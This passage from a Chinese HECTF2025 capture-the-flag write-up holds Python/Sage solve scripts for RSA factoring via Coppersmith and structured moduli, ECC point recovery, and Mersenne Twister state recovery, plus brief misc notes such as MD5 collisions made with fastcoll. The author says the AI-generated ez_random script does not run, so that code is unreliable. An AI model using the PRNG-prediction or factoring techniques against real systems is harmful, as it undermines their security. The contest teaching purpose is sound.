        g_poly = a * k^2 + b * k + c_
        try:
            a_inv = inverse_mod(a, n)
        except:
            continue
        g_monic = g_poly * a_inv
        X = 2^368
        roots = g_monic.small_roots(X=X, beta=0.5)
        for k0 in roots:
            k0 = Integer(k0)
            q = q0 + A * k0
            if n % q == 0:
                p = n // q
                # 验证 qinvp 是否匹配
                if (q * qinvp) % p != 1:
                    # 交换 p 和 q 再次验证
                    p, q = q, p
                if (q * qinvp) % p == 1:
                    # 验证 dq 的低位
                    dq_recovered = inverse_mod(e, q-1)
                    if dq_recovered % (2^128) == d0:
                        found = True
                        print("Found p and q:")
                        print("p =", p)
                        print("q =", q)
                        # 使用 CRT 解密
                        dp = inverse_mod(e, p-1)
                        dq = dq_recovered
                        m1 = pow(c, dp, p)
                        m2 = pow(c, dq, q)
                        h = (qinvp * (m1 - m2)) % p
                        m = m2 + h * q
                        # 转换为字节串
                        from Crypto.Util.number import long_to_bytes
                        flag = long_to_bytes(int(m))
                        print("Flag (hex):", m.hex())
                        print("Flag (bytes):", flag)
                        sys.exit(0)
                if found:
                    break
    if found:
        break

if not found:
    print("No solution found.")
```
![assets/HECTF2025 WP/屏幕截图 2025-12-21 132002 1.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230907-1554571493.png)
### simple_math
```
from math import isqrt

from Crypto.Util.number import long_to_bytes

  

n = 6060692198787960152570793202726365711311067556697852613814176910700809041055277955552588176731629472381832554602777717596533323522044796564358407030079609

c = 5573794528528829992069712881335829633592490157207670497446565713699227752853445149101948822818379411492395823975723302499892036773925698697672557700027422

  

B = 1 << 128

B2 = B * B

  

# print base-B blocks for inspection

print('B =', B)

v0 = n // B2

print('v0 =', v0)

w0 = n % B

n1 = n // B

w1 = n1 % B

n2 = n1 // B

w2 = n2 % B

n3 = n2//B

w3 = n3 % B

print('w0(low)=', w0)

print('w1(mid)=', w1)

print('w2(high)=', w2)

print('w3(top)=', w3)

  

# reconstruct v from top and low blocks

# try small adjustments to v1 (top word) to account for carries

found = False

for delta in range(-5,6):

    v1 = w3 + delta

    if v1 < 0:

        continue

    v = v1 * B + w0

    rhs = n - v*(B-1)*(B-1)

    if rhs % B != 0:

        continue

    u2 = rhs // B

    u = isqrt(u2)

    if u*u != u2:

        continue

    print('found v1 delta', delta)

    print('reconstructed v =', v)

    print('u=', u)

    found = True

    break

if not found:

    print('no v1 adjustment worked, abort')

    raise SystemExit(1)

# now u = f+g, v = f*g

disc = u*u - 4*v

if disc < 0:

    print('negative discriminant, abort')

    raise SystemExit(1)

s = isqrt(disc)

if s*s != disc:

    print('disc not perfect square, abort')

    raise SystemExit(1)

f = (u + s) // 2

g = (u - s) // 2

print('f=', f)

print('g=', g)

p = (f << 128) + g

q = (g << 128) + f

print('p=', p)

print('q=', q)

if p*q == n:

    print('p*q == n confirmed')

else:

    print('p*q != n !!!')

  

# Now compute 8th roots. We'll compute roots modulo p and q separately

from Crypto.Util.number import inverse

  

e = 8

  

# compute all solutions of x^8 = c mod p

# For prime p, number of solutions equals gcd(8, p-1) at most.

  

def roots_mod_prime(c, p):

    # compute roots by repeated square-rooting since p % 4 == 3

    sols = set()

    # first, find square roots y of c (y^2 = c)

    try:

        y = pow(c, (p+1)//4, p)

    except Exception:

        return []

    cand_y = [y, (-y) % p]

    for yval in cand_y:

        # try to find z s.t. z^2 = yval

        z = pow(yval, (p+1)//4, p)

        if pow(z,2,p) != yval:

            continue

        cand_z = [z, (-z) % p]

        for zval in cand_z:

            # try to find x s.t. x^2 = zval

            x = pow(zval, (p+1)//4, p)

            if pow(x,2,p) != zval:

                continue

            cand_x = [x, (-x) % p]

            for xv in cand_x:

                if pow(xv,8,p) == c % p:

                    sols.add(xv)

    return list(sols)

  

rp = roots_mod_prime(c % p, p)

rq = roots_mod_prime(c % q, q)

print('roots mod p count', len(rp), 'roots mod q count', len(rq))

  

# CRT combine

from itertools import product

  

def crt(a1, m1, a2, m2):

    m1_inv = inverse(m1, m2)

    t = (a2 - a1) * m1_inv % m2

    return (a1 + m1 * t) % (m1*m2)

  

candidates = []

for ap, aq in product(rp, rq):

    x = crt(ap, p, aq, q)

    candidates.append(x)

  

print('total candidates', len(candidates))

  

for x in candidates:

    try:

        msg = long_to_bytes(x)

        if b'flag' in msg or b'FLAG' in msg or b'{' in msg:

            print('possible:', msg)

    except Exception:

        pass

  

# If none found, try also small multiplicative factors (±p etc)

for x in candidates:

    for k in range(1):

        try:

            msg = long_to_bytes(x)

            if all(32 <= b < 127 for b in msg[:20]):

                print('ascii candidate:', msg)

        except Exception:

            pass

  

print('done')
```
![assets/HECTF2025 WP/file-20251221185413152.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230835-377699723.png)
### ez_ecc
```
import random

  

def poly_gcd(a, b, p):

    while b:

        a, b = b, poly_mod(a, b, p)

    if not a: return []

    inv = pow(a[0], -1, p)

    return [x * inv % p for x in a]

  

def poly_mod(a, b, p):

    while a and a[0] == 0: a.pop(0)

    while b and b[0] == 0: b.pop(0)

    if not b: return a # Should not happen in GCD

    if len(a) < len(b):

        return a

    res = list(a)

    inv_b0 = pow(b[0], -1, p)

    for i in range(len(a) - len(b) + 1):

        if res[i] == 0: continue

        factor = res[i] * inv_b0 % p

        for j in range(len(b)):

            res[i+j] = (res[i+j] - factor * b[j]) % p

    while res and res[0] == 0:

        res.pop(0)

    return res

  

def poly_mul(a, b, p):

    res = [0] * (len(a) + len(b) - 1)

    for i in range(len(a)):

        for j in range(len(b)):

            res[i+j] = (res[i+j] + a[i] * b[j]) % p

    return res

  

def poly_pow_mod(base, exp, mod, p):

    res = [1]

    while exp > 0:

        if exp % 2 == 1:

            res = poly_mod(poly_mul(res, base, p), mod, p)

        base = poly_mod(poly_mul(base, base, p), mod, p)

        exp //= 2

    return res

  

def find_roots(f, p):

    # f is [c4, c3, c2, c1, c0]

    # 1. GCD(f, x^p - x)

    x_p = poly_pow_mod([1, 0], p, f, p)

    x_p_minus_x = list(x_p)

    if len(x_p_minus_x) < 2:

        x_p_minus_x = [0] * (2 - len(x_p_minus_x)) + x_p_minus_x

    x_p_minus_x[-2] = (x_p_minus_x[-2] - 1) % p

    g = poly_gcd(f, x_p_minus_x, p)

    roots = []

    def split(poly):

        if not poly or len(poly) <= 1: return

        if len(poly) == 2:

            roots.append(p - poly[1] * pow(poly[0], -1, p) % p)

            return

        # Cantor-Zassenhaus

        while True:

            a = [random.randint(0, p-1) for _ in range(len(poly)-1)]

            # GCD(poly, (a(x))^((p-1)/2) - 1)

            h = poly_pow_mod(a, (p-1)//2, poly, p)

            h[-1] = (h[-1] - 1) % p

            g = poly_gcd(poly, h, p)

            if 0 < len(g) - 1 < len(poly) - 1:

                split(g)

                # poly / g

                q = []

                temp = list(poly)

                for i in range(len(poly) - len(g) + 1):

                    factor = temp[i] * pow(g[0], -1, p) % p

                    q.append(factor)

                    for j in range(len(g)):

                        temp[i+j] = (temp[i+j] - factor * g[j]) % p

                split(q)

                return

  

    split(g)

    return roots

  

p = 75383562943018431645780942506580225344330334736970239935645262885094438041259

b = 3

a = 1

  

P2 = (14964670759245329390375308321411786978157102161189322115734645373169213999800, 15559632617790587507311758059936601413780195603883582327743315824295031740424)

PQ = (51100085833472068924911572616418783709145128504503165799653950174447959545831, 34374474833785437488342051727913857907583782324172232648593714071718811330923)

Q2 = (58182088469274002379975156536635905530143308283684486683439461054185269349870, 60318982918282038994679589134874004093617373250696961967201026789735803518347)

  

def get_roots_for_xr(xr):

    c3 = -4 * xr % p

    c2 = -2 * a % p

    c1 = -(8 * b + 4 * xr * a) % p

    c0 = (a**2 - 4 * xr * b) % p

    f = [1, c3, c2, c1, c0]

    return find_roots(f, p)

  

print("Finding roots for P...")

roots_p = get_roots_for_xr(P2[0])

print(f"Roots for P: {roots_p}")

  

print("Finding roots for Q...")

roots_q = get_roots_for_xr(Q2[0])

print(f"Roots for Q: {roots_q}")

  

from Crypto.Util.number import long_to_bytes

  

def get_y(x):

    y2 = (x**3 + a*x + b) % p

    if pow(y2, (p-1)//2, p) == 1:

        y = pow(y2, (p+1)//4, p)

        return [y, p - y]

    return []

  

def add_points(P1, P2, p, a):

    if P1 is None: return P2

    if P2 is None: return P1

    x1, y1 = P1

    x2, y2 = P2

    if x1 == x2 and y1 == (p - y2) % p:

        return None

    if x1 == x2 and y1 == y2:

        l = (3 * x1**2 + a) * pow(2 * y1, -1, p) % p

    else:

        l = (y2 - y1) * pow(x2 - x1, -1, p) % p

    x3 = (l**2 - x1 - x2) % p

    y3 = (l * (x1 - x3) - y1) % p

    return (x3, y3)

  

for x1 in roots_p:

    for y1 in get_y(x1):

        P = (x1, y1)

        if add_points(P, P, p, a) == P2:

            for x2 in roots_q:

                for y2 in get_y(x2):

                    Q = (x2, y2)

                    if add_points(Q, Q, p, a) == Q2:

                        if add_points(P, Q, p, a) == PQ:

                            print("Found P and Q!")

                            print(f"m1 = {x1}")

                            print(f"m2 = {x2}")

                            # Try different padding lengths

                            for length in range(30, 35):

                                try:

                                    f1 = x1.to_bytes(length, 'big')

                                    f2 = x2.to_bytes(length, 'big')

                                    print(f"Flag (len {length}): {f1 + f2}")

                                except:

                                    pass
```
![assets/HECTF2025 WP/file-20251221185609738.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075232009-1695457981.png)
### ez_random
```
# -*- coding: utf-8 -*-

# Recover flag from:

# 1) shuffled bit list (flag_list)

# 2) 312 numbers from random.getrandbits(64) after shuffle (outs64)

  

Aconst = 0x9908B0DF

N = 624

M = 397

UPPER = 0x80000000

LOWER = 0x7fffffff

  

def temper(y: int) -> int:

    y &= 0xffffffff

    y ^= (y >> 11)

    y ^= (y << 7) & 0x9d2c5680

    y ^= (y << 15) & 0xefc60000

    y ^= (y >> 18)

    return y & 0xffffffff

  

def unshift_right_xor(y: int, shift: int) -> int:

    x = 0

    for i in range(31, -1, -1):

        bit = (y >> i) & 1

        if i + shift <= 31:

            bit ^= (x >> (i + shift)) & 1

        x |= bit << i

    return x & 0xffffffff

  

def unshift_left_xor_and(y: int, shift: int, mask: int) -> int:

    x = 0

    for i in range(32):

        bit = (y >> i) & 1

        if i - shift >= 0 and ((mask >> i) & 1):

            bit ^= (x >> (i - shift)) & 1

        x |= bit << i

    return x & 0xffffffff

  

def untemper(y: int) -> int:

    y &= 0xffffffff

    y = unshift_right_xor(y, 18)

    y = unshift_left_xor_and(y, 15, 0xefc60000)

    y = unshift_left_xor_and(y, 7, 0x9d2c5680)

    y = unshift_right_xor(y, 11)

    return y & 0xffffffff

  

def inv_h(t: int) -> int:

    # h(y) = (y>>1) ^ (Aconst if y&1 else 0)

    t &= 0xffffffff

    if (t >> 31) == 0:

        return (t << 1) & 0xffffffff

    else:

        return (((t ^ Aconst) << 1) | 1) & 0xffffffff

  

class Word:

    __slots__=("msb","low","full")

    def __init__(self):

        self.msb=None

        self.low=None

        self.full=None

  

def set_full(w:Word, val:int) -> bool:

    val &= 0xffffffff

    if w.full is not None:

        return w.full == val

    msb = (val >> 31) & 1

    low = val & LOWER

    if w.msb is not None and w.msb != msb: return False

    if w.low is not None and w.low != low: return False

    w.full = val

    w.msb = msb

    w.low = low

    return True

  

def set_msb(w:Word, msb:int) -> bool:

    msb &= 1

    if w.msb is not None and w.msb != msb:

        return False

    w.msb = msb

    if w.full is not None and ((w.full>>31)&1) != msb:

        return False

    if w.full is None and w.low is not None:

        w.full = ((msb<<31) | w.low) & 0xffffffff

    return True

  

def set_low(w:Word, low:int) -> bool:

    low &= LOWER

    if w.low is not None and w.low != low:

        return False

    w.low = low

    if w.full is not None and (w.full & LOWER) != low:

        return False

    if w.full is None and w.msb is not None:

        w.full = ((w.msb<<31) | low) & 0xffffffff

    return True

  

def propagate_inplace(c: int, S: list[int]) -> list[int] | None:

    """

    Reconstruct old MT state A given:

      - outputs32 untempered in order (length 624) => S

      - first part is A[c..623], second part is B[0..c-1] (B is twist-inplace(A))

    Uses the *in-place* twist dependency:

      for i<227: B[i] = A[i+397] ^ h(y(A[i],A[i+1]))

      for i>=227: B[i] = B[i-227] ^ h(y(A[i],A[i+1]))

    """

    words = [Word() for _ in range(N)]

    # A[c..] known from S[0..N-c-1]

    for idx in range(c, N):

        if not set_full(words[idx], S[idx - c]):

            return None

    B = S[N - c:]  # B[0..c-1]

    for _ in range(2000):

        prev_full = sum(w.full is not None for w in words)

        for i in range(c):

            if i >= (N - M):  # i>=227

                t = B[i] ^ B[i - (N - M)]

                y = inv_h(t)

                if not set_msb(words[i], (y >> 31) & 1): return None

                if not set_low(words[i + 1], y & LOWER): return None

            else:

                j = i + M  # i+397

                Aj = words[j].full

                if Aj is None:

                    continue

                t = B[i] ^ Aj

                y = inv_h(t)

                if not set_msb(words[i], (y >> 31) & 1): return None

                if not set_low(words[i + 1], y & LOWER): return None

        if sum(w.full is not None for w in words) == prev_full:

            break

    return [w.full for w in words]

  

def simulate_shuffle_js(outputs32_known: list[int], r0_9bits: int):

    """

    Simulate Python's _randbelow for shuffle(n=287) using getrandbits(k),

    assuming shuffle consumed < 624 outputs and we only need top 9 bits of output0.

    """

    n = 287

    out_idx = 0

    j_at_i = {}

  

    def get_top_k_bits(idx: int, k: int):

        if idx == 0:

            if k > 9:  # won't happen for n<=287

                return None

            return r0_9bits >> (9 - k)

        if idx - 1 >= len(outputs32_known):

            return None

        v = outputs32_known[idx - 1]

        return (v >> (32 - k)) & ((1 << k) - 1)

  

    def randbelow(nval: int):

        nonlocal out_idx

        k = nval.bit_length()

        while True:

            r = get_top_k_bits(out_idx, k)

            if r is None:

                return None

            out_idx += 1

            if r < nval:

                return r

  

    for i in range(n - 1, 0, -1):

        j = randbelow(i + 1)

        if j is None:

            return None

        j_at_i[i] = j

    return j_at_i, out_idx

  

def undo_shuffle(shuffled: list[int], j_at_i: dict[int,int]) -> list[int]:

    arr = shuffled[:]

    for i in range(1, len(arr)):

        j = j_at_i[i]

        arr[i], arr[j] = arr[j], arr[i]

    return arr

  

def bits_to_flag(bits: list[int]) -> str:

    bitstr = ''.join('1' if b else '0' for b in bits)

    m = int(bitstr, 2)

    bytelen = (len(bitstr) + 7) // 8

    b = m.to_bytes(bytelen, 'big')

    return b.decode('ascii', errors='strict')

  

def solve(flag_list: list[int], outs64: list[int]) -> str:

    # IMPORTANT: for Python getrandbits(64), the two 32-bit chunks come out "low32 first".

    outs32 = []

    for x in outs64:

        lo = x & 0xffffffff

        hi = (x >> 32) & 0xffffffff

        outs32.extend([lo, hi])

  

    S = [untemper(x) for x in outs32]  # 624 words

  

    for c in range(286, 624):

        A = propagate_inplace(c, S)

        if A is None or A[0] is not None:

            continue

  

        outputs_known = [temper(A[i]) for i in range(1, 624)]  # output1..output623

  

        for r0 in range(512):  # brute top-9-bits of output0

            sim = simulate_shuffle_js(outputs_known, r0)

            if sim is None:

                continue

            j_at_i, consumed = sim

            if consumed != c:

                continue

  

            orig_bits = undo_shuffle(flag_list, j_at_i)

            s = bits_to_flag(orig_bits)

            if s.startswith("HECTF{") and s.endswith("}"):

                return s

  

    raise RuntimeError("not found")

  

# ---------------------------

# Fill these two and run:

flag_list = [1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1]

with open('output.txt', 'r') as f:

    outs64 = [int(line.strip()) for line in f]

print(solve(flag_list, outs64))
```
ai给出了flag，但是上面所谓”可复现代码“跑不通，不知道咋回事
![assets/HECTF2025 WP/file-20251221185755114.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230299-1663590900.png)
### 下个棋吧
![assets/HECTF2025 WP/file-20251221185824120.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075232063-334215834.png)
搜棋盘密码https://www.qqxiuzi.cn/bianma/qipanmima.php
选一下类型就行
![assets/HECTF2025 WP/file-20251221185903077.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230689-904248656.png)
## Misc
### 同分异构
源代码有注释
![assets/HECTF2025 WP/file-20251221190011645.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230667-229835642.png)
解密后是md5.php
进去之后要两个md5相同内容不同的文件，直接用fastcoll生成
![assets/HECTF2025 WP/file-20251221190147771.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230191-1057936357.png)
生成的两个文件导入就可以得到flag
![assets/HECTF2025 WP/file-20251221190211959.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230431-389092708.png)
### Word_Document
里面藏了一个文件
![assets/HECTF2025 WP/file-20251221190306841.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230600-1984308175.png)
发现少了文件头，插入字节即可
![assets/HECTF2025 WP/file-20251221190352870.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230539-476720251.png)
取消隐藏文字，文档末尾有密码
![assets/HECTF2025 WP/file-20251221190425211.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230146-770225463.png)
![assets/HECTF2025 WP/file-20251221190458226.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075231704-1364766990.png)
密码是3.1415926（Q要改回来）
打开压缩包就可以获得flag
### Check_In
稍微对照一下就可以弄出来
![assets/HECTF2025 WP/屏幕截图 2025-12-20 202519.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230289-1846875492.png)
### OSINT
后面突然发现\*号代表字的个数就找出来了
河北的学校，三个字，肯定是河北省石家庄市
再试试大街就能弄出来
![assets/HECTF2025 WP/989e5c5db016f96322b39a336b1ebed4.png](/assets/cnblogs/HECTF2025 WP/3539156-20251222075230571-1976062570.png)
### 签到
关注公众号
### 快来反馈吧~
问卷题
